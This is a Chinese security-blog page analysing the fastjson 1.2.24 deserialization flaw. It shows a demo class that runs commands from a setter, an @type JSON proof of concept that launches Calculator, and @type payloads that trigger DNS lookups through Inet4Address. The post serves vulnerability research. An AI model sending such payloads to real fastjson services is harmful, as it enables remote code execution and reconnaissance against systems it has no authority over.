<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="fastjson-002">
<meta property="og:type" content="article">
<meta property="og:title" content="fastjson 1.2.24漏洞分析">
<meta property="og:url" content="http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="九指 | [ninefiger&#39;s blog]">
<meta property="og:description" content="fastjson-002">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/1.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/2.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/3.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/4.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/a.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/b.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/c.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/d.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/5.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/6.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/7.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/8.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/9.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/10.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/11.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/12.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/13.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/14.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/15.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/16.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/17.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/18.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/e.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/19.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/20.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/21.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/22.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/23.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/24.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/25.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/26.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/27.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/28.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/29.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/30.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/31.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/32.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/33.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/34.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/35.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/36.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/37.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/38.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/39.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/40.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/41.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/42.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/43.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/44.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/45.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/46.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/47.png">
<meta property="article:published_time" content="2022-11-11T06:01:00.000Z">
<meta property="article:modified_time" content="2022-11-11T07:42:08.214Z">
<meta property="article:author" content="ninefiger">
<meta property="article:tag" content="漏洞分析">
<meta property="article:tag" content="fastjson">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://blog.ninefiger.top/img/fastjson%201.2.24漏洞分析/1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
        
      
    
    <!-- title -->
    <title>fastjson 1.2.24漏洞分析</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="九指 | [ninefiger&#39;s blog]" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/link">链接</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/about/">关于</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇 " href="/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇 " href="/2022/11/11/fastjson%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=fastjson 1.2.24漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.24漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=fastjson 1.2.24漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=fastjson 1.2.24漏洞分析&body=Check out this article: http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.24漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.24漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.24漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.24漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=fastjson 1.2.24漏洞分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=fastjson 1.2.24漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%A8%A1%E6%8B%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">1. 模拟命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">2. 利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-DNS%E8%AF%B7%E6%B1%82"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 DNS请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-java-net-Inet4Address"><span class="toc-number">2.1.1.</span> <span class="toc-text">2.1.1 java.net.Inet4Address</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-%E8%A1%A5%E5%85%85-%E5%86%85%E7%BD%AE%E6%9C%89deserializer%E5%AF%B9%E5%BA%94%E7%9A%84%E7%B1%BB%E5%90%8D"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.1.2 补充-内置有deserializer对应的类名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-%E8%A1%A5%E5%85%85-Inet4Address%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8D"><span class="toc-number">2.1.3.</span> <span class="toc-text">2.1.2 补充-Inet4Address解析域名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-4-java-net-URL"><span class="toc-number">2.1.4.</span> <span class="toc-text">2.1.4 java.net.URL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-5-poc%E6%9E%84%E9%80%A0"><span class="toc-number">2.1.5.</span> <span class="toc-text">2.1.5 poc构造</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 TemplatesImpl利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-1-%E6%B3%A8%E6%84%8F%E7%A7%81%E6%9C%89%E5%AD%97%E6%AE%B5%E7%9A%84%E8%B5%8B%E5%80%BC"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1 注意私有字段的赋值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-2-%E6%95%B0%E7%BB%84%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%8F%98%E9%87%8F"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2 数组类型的变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-3-getOutputProperties"><span class="toc-number">2.2.3.</span> <span class="toc-text">2.2.3 getOutputProperties</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-4-%E7%BB%93%E5%90%88CB%E5%88%A9%E7%94%A8%E9%93%BE%E7%9A%84%E6%96%B0%E6%80%9D%E8%B7%AF"><span class="toc-number">2.2.4.</span> <span class="toc-text">2.2.4 结合CB利用链的新思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-BCEL%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 BCEL利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-1-BasicDataSource%E5%85%B3%E9%94%AE%E7%B1%BB"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.3.1 BasicDataSource关键类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-3-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8JSON-parse-%E8%A7%A6%E5%8F%91"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.3.3 如何使用JSON.parse()触发</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-3-1-Type%E4%B8%BAJSONObject%E7%B1%BB%E6%97%B6"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">2.3.3.1 @Type为JSONObject类时</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-3-2-%E6%89%A7%E8%A1%8C%E5%88%B0key-toString-%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">2.3.3.2 执行到key.toString()方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-3-3-%E8%A7%A6%E5%8F%91invoke"><span class="toc-number">2.3.2.3.</span> <span class="toc-text">2.3.3.3 触发invoke</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-3-4-poc%E6%9E%84%E9%80%A0"><span class="toc-number">2.3.2.4.</span> <span class="toc-text">2.3.3.4 poc构造</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-4-1-%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%9D%97%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.3.2.5.</span> <span class="toc-text">2.3.4.1 恶意代码块位置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-4-2-%E5%BC%B9%E5%87%BA%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="toc-number">2.3.2.6.</span> <span class="toc-text">2.3.4.2 弹出计算器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-4-3-%E5%9B%9E%E6%98%BE"><span class="toc-number">2.3.2.7.</span> <span class="toc-text">2.3.4.3 回显</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-4-4-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.3.2.8.</span> <span class="toc-text">2.3.4.4 内存马</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 JdbcRowSetImpl利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-1-JNDI%E8%B0%83%E7%94%A8"><span class="toc-number">2.4.1.</span> <span class="toc-text">2.4.1 JNDI调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-2-%E8%A7%A6%E5%8F%91%E9%93%BEsetAutoCommit"><span class="toc-number">2.4.2.</span> <span class="toc-text">2.4.2 触发链setAutoCommit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-3-Poc"><span class="toc-number">2.4.3.</span> <span class="toc-text">2.4.3 Poc</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        fastjson 1.2.24漏洞分析
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">ninefiger</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-11-11T06:01:00.000Z" itemprop="datePublished">2022-11-11</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6/">攻防研究</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/fastjson/" rel="tag">fastjson</a>, <a class="tag-link-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <pre><code>  通过fastjson解析json字符串的流程得知：`@type`对应类名，通过获取`setXxx`或`set_Xxx`方法，对应`xxx`属性，先创建一个类对象，再通过invoke调用`setXxx`方法进行赋值
</code></pre>
<h2 id="1-模拟命令执行"><a href="#1-模拟命令执行" class="headerlink" title="1. 模拟命令执行"></a>1. 模拟命令执行</h2><p>因此只需要找到一个setXxx中存在代码执行的类构造利用链，比如下面这个示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vuln.POJO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evilClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//恶意代码</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(name);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> vuln.POJO.evilClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc_1_2_24</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String poc = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;vuln.POJO.evilClass\&quot;,\&quot;name\&quot;:\&quot;open /System/Applications/Calculator.app\&quot;&#125;&quot;</span>;</span><br><span class="line">        evilClass object = (evilClass)JSON.parse(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/1.png" alt="1" style="zoom:50%;" /></div>

<h2 id="2-利用链"><a href="#2-利用链" class="headerlink" title="2. 利用链"></a>2. 利用链</h2><h3 id="2-1-DNS请求"><a href="#2-1-DNS请求" class="headerlink" title="2.1 DNS请求"></a>2.1 DNS请求</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="attr">&quot;address&quot;</span>:,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="2-1-1-java-net-Inet4Address"><a href="#2-1-1-java-net-Inet4Address" class="headerlink" title="2.1.1 java.net.Inet4Address"></a>2.1.1 java.net.Inet4Address</h4><p>直接看<code>java.net.Inet4Address</code>类，并没有找到属性值；通过调试发现，该类并没有走之前那个流程，他的<code>deserializer</code>是系统中默认就有的<br>于是查看<code>getDeserializer</code>方法，进入<code>this.derializers.get(type);</code>中，遍历所有内置映射好的类；发现其中就包括<code>java.net.Inet4Address</code></p>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/2.png" alt="2" style="zoom:50%;" /></div>

<h4 id="2-1-2-补充-内置有deserializer对应的类名"><a href="#2-1-2-补充-内置有deserializer对应的类名" class="headerlink" title="2.1.2 补充-内置有deserializer对应的类名"></a>2.1.2 补充-内置有deserializer对应的类名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">java.util.concurrent.atomic.AtomicBoolean</span><br><span class="line">com.alibaba.fastjson.JSONObject</span><br><span class="line">byte</span><br><span class="line">java.sql.Date</span><br><span class="line">java.lang.StringBuilder</span><br><span class="line">java.lang.Double</span><br><span class="line">java.sql.Timestamp</span><br><span class="line">java.lang.Cloneable</span><br><span class="line">java.lang.StackTraceElement</span><br><span class="line">java.math.BigDecimal</span><br><span class="line">boolean</span><br><span class="line">java.util.UUID</span><br><span class="line">java.net.URI</span><br><span class="line">java.util.TimeZone</span><br><span class="line">java.util.Map</span><br><span class="line">java.math.BigInteger</span><br><span class="line">java.lang.Long</span><br><span class="line">java.lang.Class</span><br><span class="line">java.io.Closeable</span><br><span class="line">[C</span><br><span class="line">java.io.File</span><br><span class="line">char</span><br><span class="line">java.net.InetSocketAddress</span><br><span class="line">double</span><br><span class="line">java.util.concurrent.atomic.AtomicLong</span><br><span class="line">java.io.Serializable</span><br><span class="line">com.alibaba.fastjson.JSONPath</span><br><span class="line">java.util.concurrent.ConcurrentHashMap</span><br><span class="line">java.util.concurrent.atomic.AtomicReference</span><br><span class="line">java.lang.Integer</span><br><span class="line">java.util.Date</span><br><span class="line">java.util.ArrayList</span><br><span class="line">java.util.Locale</span><br><span class="line">java.lang.Boolean</span><br><span class="line">java.lang.Number</span><br><span class="line">java.util.List</span><br><span class="line">java.util.Currency</span><br><span class="line">java.net.Inet6Address</span><br><span class="line">java.lang.Short</span><br><span class="line">java.util.concurrent.atomic.AtomicLongArray</span><br><span class="line">java.util.concurrent.ConcurrentMap</span><br><span class="line">java.net.Inet4Address</span><br><span class="line">java.util.Collection</span><br><span class="line">java.util.Calendar</span><br><span class="line">java.lang.ref.SoftReference</span><br><span class="line">int</span><br><span class="line">javax.xml.datatype.XMLGregorianCalendar</span><br><span class="line">java.util.regex.Pattern</span><br><span class="line">java.net.InetAddress</span><br><span class="line">short</span><br><span class="line">java.util.concurrent.atomic.AtomicInteger</span><br><span class="line">com.alibaba.fastjson.JSONArray</span><br><span class="line">java.nio.charset.Charset</span><br><span class="line">java.util.LinkedHashMap</span><br><span class="line">java.util.TreeMap</span><br><span class="line">long</span><br><span class="line">java.lang.StringBuffer</span><br><span class="line">java.lang.Comparable</span><br><span class="line">java.text.SimpleDateFormat</span><br><span class="line">float</span><br><span class="line">java.sql.Time</span><br><span class="line">java.lang.ref.WeakReference</span><br><span class="line">java.lang.String</span><br><span class="line">java.util.HashMap</span><br><span class="line">java.lang.Character</span><br><span class="line">java.lang.Byte</span><br><span class="line">java.lang.Object</span><br><span class="line">java.lang.Float</span><br><span class="line">java.util.concurrent.atomic.AtomicIntegerArray</span><br><span class="line">java.net.URL</span><br></pre></td></tr></table></figure>
<p>获取到的类为<code>MiscCodec</code>，因此反序列化的方法在 <code>com.alibaba.fastjson.serializer#deserialze</code>中</p>
<ul>
<li>如下图中，当类是<code>InetSocketAddress</code>时，会单独处理</li>
<li>会判断参数是否为<code>val</code>，然后进入<code>parse.parse()</code>解析流程</li>
</ul>
<div align=center><img src="/img/fastjson 1.2.24漏洞分析/3.png" alt="3" style="zoom:50%;" /></div>

